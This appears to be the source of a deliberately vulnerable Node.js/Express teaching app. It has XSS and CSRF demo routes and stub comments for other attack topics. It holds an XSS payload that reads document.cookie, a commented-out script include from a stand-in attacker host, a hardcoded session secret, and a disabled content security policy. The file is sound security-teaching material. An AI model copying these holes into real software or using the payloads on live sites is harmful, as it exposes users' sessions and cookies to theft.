/**
 * Hd7exploit
 * hd7exploit.wordpress.com/
 */
const express = require('express')
const app = express()
app.use(express.static('public'))
app.set('view engine', 'pug')
// HELMET
var helmet = require('helmet')
app.use(helmet())
app.use(helmet.noCache())
app.use(helmet.frameguard())
app.use(helmet.dnsPrefetchControl()) // Sets "X-DNS-Prefetch-Control: off".
app.use(helmet.referrerPolicy({ policy: 'no-referrer' })) // Sets "Referrer-Policy: same-origin".
var uuid = require('node-uuid')
app.use(function (req, res, next) {
  res.locals.nonce = uuid.v4()
  next()
})
// app.use(helmet.contentSecurityPolicy({
//   directives: {
//     defaultSrc: ["'self'"],
//     scriptSrc: [
//       "'self'",
//       function (req, res) {
//           return "'nonce-" + res.locals.nonce + "'"
//       },
//     ],
//     reportUri: '/report-violation'
//   }
// }))
//
var session = require('express-session');
var cookieParser = require('cookie-parser')
var bodyParser = require('body-parser')
var parseForm = bodyParser.urlencoded({ extended: false })
var csrf = require('csurf');

var expiryDate = new Date(Date.now() + 60 * 60 * 1000) // 1 hour
app.use(session({
  secret: 'victoriasecret',
  name: 'hd7session',
  cookie: {
    //secure: true,
    httpOnly: true,
    //domain: 'hd7exploit.com',
    //path: '/',
    expires: expiryDate
  }
}))
// parse cookies
// we need this because "cookie" is true in csrfProtection
app.use(cookieParser())
//app.use(csrf());
var csrfProtection = csrf({ cookie: true })

// XSS
app.get('/xss/', function (req, res) {
  // Print header
  // for(var item in req.headers) {
  //   console.log(item + ": " + req.headers[item]);
  // }
  var name = req.query.name || '';
  res.render('xss', { 
    title: 'XSS', 
    message: 'Mr hd7', 
    content: '<script>alert(document.cookie)</script>',
    nonce: res.locals.nonce,
    //content: '<script src="http://hacked.hd:3000/xxx.js"></script>',
    name: name
  });
});

// CSRF
app.get('/csrf', csrfProtection,function (req, res) {
  res.render('csrf',{
    _csrf:req.csrfToken()
  })
})

// Bruce Force

// DDOS protection

// Object injection : demo eval

// Shell Injection 

// Directory travel

// Misconfiguration

// Authentication and Authorizarion

// SSL hacking : demo

// SQL injection Hacking with SQLMAP : demo

// Introduce BurpSuite and Acutix

app.post('/process', parseForm, csrfProtection,function (req, res) {
  res.send('Valid form')
})

// Violation
app.post('/report-violation', function (req, res) {
  if (req.body) {
    console.log('CSP Violation: ', req.body)
  } else {
    console.log('CSP Violation: No data received!')
  }
  res.status(204).end()

})

app.listen(3000, function () {
  console.log('Vulnerability App on port 3000!')
})

